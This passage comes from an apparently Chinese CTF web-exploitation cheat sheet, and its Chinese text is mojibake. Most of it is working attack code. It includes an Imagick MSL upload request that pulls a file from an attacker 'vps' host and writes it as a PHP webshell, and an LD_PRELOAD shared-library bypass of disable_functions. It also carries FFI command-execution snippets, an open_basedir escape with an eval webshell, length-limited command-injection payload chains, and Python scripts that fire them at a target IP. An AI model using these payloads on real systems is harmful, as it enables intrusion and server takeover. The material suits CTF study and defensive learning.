</span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/53</span><br><span class="line">7.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i</span><br><span class="line">mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmq</span><br><span class="line">Tayg6bqr</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>348</span><br><span class="line"></span><br><span class="line"><span class="language-xml">------WebKitFormBoundaryeTvfNEmqTayg6bqr</span></span><br><span class="line"><span class="language-xml">Content-Disposition: form-data; name=&quot;123&quot;; filename=&quot;exec.msl&quot;</span></span><br><span class="line"><span class="language-xml">Content-Type: text/plain</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;http://vps:12345/positive.png&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/var/www/html/positive.php&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">------WebKitFormBoundaryeTvfNEmqTayg6bqr--</span></span><br></pre></td></tr></table></figure><p>å‘é€åï¼Œé¶æœºå°±å¾€VPSä¸­è¯·æ±‚äº†è¯¥æ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠè¯¥æ–‡ä»¶ä¸‹è½½åˆ°äº†æŒ‡å®šç›®å½•ï¼Œè®¿é—®åå³å¯RCEã€‚</p><p>è¿™ç§æ‰‹æ³•çš„é™åˆ¶ï¼š</p><ol><li>éœ€è¦é€šç½‘ï¼Œå½“ç„¶å¦‚æœä¸é€šç½‘è¿™ç§æ‰‹æ³•ä¹Ÿå­˜åœ¨ä¸€ä¸ªé‡å‘½åæ–‡ä»¶çš„åŠŸèƒ½ï¼Œå¦‚æœç½‘ç«™æœ‰ä¸Šä¼ åŠŸèƒ½å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ‰‹æ³•å°†æ¶æ„çš„JPGé‡å‘½åæˆPHPï¼›</li><li>éœ€è¦çŸ¥é“ç½‘ç«™çš„ç›®å½•ï¼ˆæ¯”èµ›ä¸­é€šå¸¸æ˜¯/var/www/htmlæˆ–è€…/appè¿™ç±»ï¼‰ï¼›</li><li>éœ€è¦åœ¨ç½‘ç«™ç›®å½•ä¸‹æœ‰å†™æƒé™ï¼Œå½“ç„¶å¦‚æœçŸ¥é“ç±»ä¼¼äºuploadè¿™ç§æ–‡ä»¶å¤¹çš„è·¯å¾„ä¹Ÿå¯ä»¥ï¼ˆå› ä¸ºé€šå¸¸å®ƒä»¬æ˜¯å¯å†™çš„ï¼›</li><li>æœ€æœ€é‡è¦çš„ï¼šéœ€è¦æœ‰è£…Imagickæ‰©å±•ï¼Œè¯¥æ‰©å±•å…¶å®ä¸æ˜¯é»˜è®¤è‡ªå¸¦çš„ï¼ˆä¸€å®šç¨‹åº¦ä¸Šé™åˆ¶äº†æ”»å‡»é¢ï¼‰ã€‚</li></ol></li><li><p><code>$class = new $a($b);</code> / <code>(new $a($b))-&gt;$c();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$class</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;test string&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>â€&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;system&#x27;</span>)-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//è§¦å‘funcå‡½æ•°ï¼šfunc()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">ReflectionFunction</span>(<span class="string">&#x27;func&#x27;</span>)-&gt;<span class="title function_ invoke__">invoke</span>();</span><br></pre></td></tr></table></figure></li><li><p><code>(new $a($b))-&gt;$c($d);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è§¦å‘systemå‡½æ•°ï¼šsystem(&quot;ls&quot;)</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;system&#x27;</span>))-&gt;<span class="title function_ invoke__">invoke</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><p>â€‹</p></li></ul><h3 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h3><h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><p>Linuxæ“ä½œç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥åº“åœ¨åŠ è½½è¿‡ç¨‹ä¸­ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå…ˆè¯»å–LD_PRELOADç¯å¢ƒå˜é‡å’Œé»˜è®¤é…ç½®æ–‡ä»¶ <code>/etc/ld.so.preload</code>ï¼Œå¹¶å°†è¯»å–åˆ°çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶è¿›è¡Œé¢„åŠ è½½ï¼Œå³ä½¿ç¨‹åºä¸ä¾èµ–è¿™äº›åŠ¨æ€é“¾æ¥åº“ï¼ŒLD_PRELOADç¯å¢ƒå˜é‡å’Œ <code>/etc/ld.so.preload</code> é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ä¾ç„¶ä¼šè¢«è£…è½½ï¼Œå› ä¸ºå®ƒä»¬çš„ä¼˜å…ˆçº§æ¯”LD_LIBRARY_PATHç¯å¢ƒå˜é‡æ‰€å®šä¹‰çš„é“¾æ¥åº“æŸ¥æ‰¾è·¯å¾„çš„æ–‡ä»¶ä¼˜å…ˆçº§è¦é«˜ï¼Œæ‰€ä»¥èƒ½å¤Ÿæå‰äºç”¨æˆ·è°ƒç”¨çš„åŠ¨æ€åº“è½½å…¥ã€‚</p><p>é€šè¿‡LD_PRELOADç¯å¢ƒå˜é‡ï¼Œèƒ½å¤Ÿè½»æ˜“çš„åŠ è½½ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚é€šè¿‡è¿™ä¸ªåŠ¨æ€åº“åŠ«æŒç³»ç»ŸAPIå‡½æ•°ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½ä¼šæ‰§è¡Œæ¤å…¥çš„ä»£ç ã€‚</p><p>åˆ©ç”¨ <code>error_log</code> ä¸ <code>mail</code> å‡½æ•°åŠ«æŒ <code>getuid</code> å‡½æ•°ï¼Œç³»ç»Ÿé€šè¿‡ç¯å¢ƒå˜é‡(env)ä¸­çš„LD_PRELOADåŠ è½½åŠ¨æ€é“¾æ¥åº“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hack.c</span></span><br><span class="line"><span class="comment">// å°†å…¶æŒ‰ç…§ç³»ç»Ÿæ“ä½œä½æ•°ç”Ÿæˆå¯¹åº”çš„soæ–‡ä»¶</span></span><br><span class="line"><span class="comment">// gcc -c -fPIC hack.c -o hack</span></span><br><span class="line"><span class="comment">// gcc --share hack -o hack.so</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å‡½æ•°æ›¿ä»£ï¼šmail() -&gt; mb_send_mail()</p></li><li><p>å‚è€ƒ</p><p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html">åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOADæ¥ç»•è¿‡php disable_functionæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</a></p><p><a target="_blank" rel="noopener" href="https://pankas.top/2022/12/12/rctf-web/#filechecker-pro-max">RCTF 2022 - filechecker-pro-max</a></p></li></ul><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p><strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">php7-gc-bypass</a></strong>ï¼Œ<strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">php7-backtrace-bypass</a></strong>ï¼Œ<strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">php-json-bypass</a></strong></p><p>æ³•1ï¼šä¿®æ”¹<code>pwn()</code>ä¼ å…¥çš„<code>cmd</code>ï¼Œä¸Šä¼ phpè‡³å¯å†™ç›®å½•ï¼ŒincludeåŒ…å«æ‰§è¡Œã€‚</p><p>æ³•2ï¼šæ— éœ€ä¸Šä¼ ï¼Œå°†ä»£ç æ”¾å…¥<code>eval</code>å‡½æ•°æ‰§è¡Œã€‚</p><ul><li><p>å‚è€ƒé¢˜</p><p>buuoj-GKCTF2020-CheckIn</p></li></ul><h4 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h4><p>ä½¿ç”¨æ¡ä»¶ï¼šPHPç‰ˆæœ¬&gt;=7.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>); </span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;cd /;./readflag &gt; /var/www/html/good.txt&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">readgzfile</span>(<span class="string">&quot;good.txt&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç›´æ¥è°ƒç”¨phpæºç ä¸­çš„å‡½æ•°ï¼Œphp_execçš„typeä¸º3æ—¶å¯¹åº”çš„æ˜¯passthruï¼Œç›´æ¥å°†ç»“æœåŸå§‹è¾“å‡º</span></span><br><span class="line"><span class="variable">$e</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int php_exec(int type, char *cmd);&quot;</span>);</span><br><span class="line"><span class="variable">$e</span>-&gt;<span class="title function_ invoke__">php_exec</span>(<span class="number">3</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨cé‡Œçš„popenï¼Œç„¶åä»ç®¡é“ä¸­è¯»å–ç»“æœ</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls /&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$c</span> = <span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">fgetc</span>(<span class="variable">$o</span>)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$d</span> .= <span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">dechex</span>(<span class="variable">$c</span>)),<span class="number">2</span>,<span class="string">&quot;0&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">pclose</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$d</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure><ul><li><p>å‚è€ƒ</p><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197745">PHP çªç ´ disable_functions å¸¸ç”¨å§¿åŠ¿ä»¥åŠä½¿ç”¨ Fuzz æŒ–æ˜å«å†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°</a></p></li></ul><p>â€‹</p><h3 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;/tmp/test&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/tmp/test&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="é•¿åº¦é™åˆ¶"><a href="#é•¿åº¦é™åˆ¶" class="headerlink" title="é•¿åº¦é™åˆ¶"></a>é•¿åº¦é™åˆ¶</h3><ul><li><p><strong>7å­—ç¬¦</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å†™å…¥è¯­å¥</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">#base64ç¼–ç å</span></span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsxXSk7</span><br><span class="line"><span class="comment">#éœ€è¦è¢«æ‰§è¡Œçš„è¯­å¥ï¼š</span></span><br><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">hp</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">1.p\\</span></span><br><span class="line"><span class="language-bash">&gt;d\&gt;\\</span></span><br><span class="line"><span class="language-bash">&gt;\ -\\</span></span><br><span class="line"><span class="language-bash">&gt;e64\\</span></span><br><span class="line"><span class="language-bash">&gt;bas\\</span></span><br><span class="line"><span class="language-bash">&gt;7\|\\</span></span><br><span class="line"><span class="language-bash">&gt;XSk\\</span></span><br><span class="line"><span class="language-bash">&gt;Fsx\\</span></span><br><span class="line"><span class="language-bash">&gt;dFV\\</span></span><br><span class="line"><span class="language-bash">&gt;kX0\\</span></span><br><span class="line"><span class="language-bash">&gt;bCg\\</span></span><br><span class="line"><span class="language-bash">&gt;XZh\\</span></span><br><span class="line"><span class="language-bash">&gt;AgZ\\</span></span><br><span class="line"><span class="language-bash">&gt;waH\\</span></span><br><span class="line"><span class="language-bash">&gt;PD9\\</span></span><br><span class="line"><span class="language-bash">&gt;o\ \\</span></span><br><span class="line"><span class="language-bash">&gt;ech\\</span></span><br><span class="line"><span class="language-bash"><span class="built_in">ls</span> -t&gt;0</span></span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/rce.php?1=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">		requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>5å­—ç¬¦</strong></p><ul><li><p>æ€è·¯1</p><p>æ‹¼æ¥å­—ç¬¦ä¸²å†™å…¥ä¸€å¥è¯ï¼ŒåŒ7å­—ç¬¦ã€‚</p></li><li><p>æ€è·¯2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">dir</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">f\&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">ht-</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">sl</span></span><br><span class="line">*&gt;v</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">rev</span></span><br><span class="line">*v&gt;0</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">hp</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">p\\</span></span><br><span class="line"><span class="language-bash">&gt;1.\\</span></span><br><span class="line"><span class="language-bash">&gt;\&gt;\\</span></span><br><span class="line"><span class="language-bash">&gt;-d\\</span></span><br><span class="line"><span class="language-bash">&gt;\ \\</span></span><br><span class="line"><span class="language-bash">&gt;64\\</span></span><br><span class="line"><span class="language-bash">&gt;se\\</span></span><br><span class="line"><span class="language-bash">&gt;ba\\</span></span><br><span class="line"><span class="language-bash">&gt;\|\\</span></span><br><span class="line"><span class="language-bash">&gt;7\\</span></span><br><span class="line"><span class="language-bash">&gt;Sk\\</span></span><br><span class="line"><span class="language-bash">&gt;X\\</span></span><br><span class="line"><span class="language-bash">&gt;x\\</span></span><br><span class="line"><span class="language-bash">&gt;Fs\\</span></span><br><span class="line"><span class="language-bash">&gt;FV\\</span></span><br><span class="line"><span class="language-bash">&gt;d\\</span></span><br><span class="line"><span class="language-bash">&gt;X0\\</span></span><br><span class="line"><span class="language-bash">&gt;k\\</span></span><br><span class="line"><span class="language-bash">&gt;g\\</span></span><br><span class="line"><span class="language-bash">&gt;bC\\</span></span><br><span class="line"><span class="language-bash">&gt;h\\</span></span><br><span class="line"><span class="language-bash">&gt;XZ\\</span></span><br><span class="line"><span class="language-bash">&gt;gZ\\</span></span><br><span class="line"><span class="language-bash">&gt;A\\</span></span><br><span class="line"><span class="language-bash">&gt;aH\\</span></span><br><span class="line"><span class="language-bash">&gt;w\\</span></span><br><span class="line"><span class="language-bash">&gt;D9\\</span></span><br><span class="line"><span class="language-bash">&gt;P\\</span></span><br><span class="line"><span class="language-bash">&gt;S&#125;\\</span></span><br><span class="line"><span class="language-bash">&gt;IF\\</span></span><br><span class="line"><span class="language-bash">&gt;&#123;\\</span></span><br><span class="line"><span class="language-bash">&gt;\$\\</span></span><br><span class="line"><span class="language-bash">&gt;o\\</span></span><br><span class="line"><span class="language-bash">&gt;ch\\</span></span><br><span class="line"><span class="language-bash">&gt;e\\</span></span><br><span class="line"><span class="language-bash">sh 0</span></span><br><span class="line">sh f            </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/?cmd=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>4å­—ç¬¦</strong></p><ul><li><p>æ€è·¯1</p><p>ä¼ å…¥<code>&gt;cat</code>ï¼Œåœ¨ç›®æ ‡ç›®å½•ä¸‹å†™å…¥catæ–‡ä»¶ï¼›</p><p>å†ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œæ‰§è¡Œ<code>&gt;* /*</code>ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ã€‚</p></li><li><p>æ€è·¯2</p><p>å­—ç¬¦æ‹¼æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">dir</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">f\&gt;</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">ht-</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">sl</span></span><br><span class="line">*&gt;v        (ç­‰åŒäºå‘½ä»¤ï¼šdir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">rev</span></span><br><span class="line">*v&gt;0        (ç­‰åŒäºå‘½ä»¤ï¼šrev v &gt; 0)(0é‡Œé¢çš„å†…å®¹ä½:ls -th &gt;f)</span><br><span class="line">sh 0        (shæ‰§è¡Œ0é‡Œé¢çš„å†…å®¹)</span><br></pre></td></tr></table></figure></li><li><p>æ€è·¯3</p><p>åå¼¹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 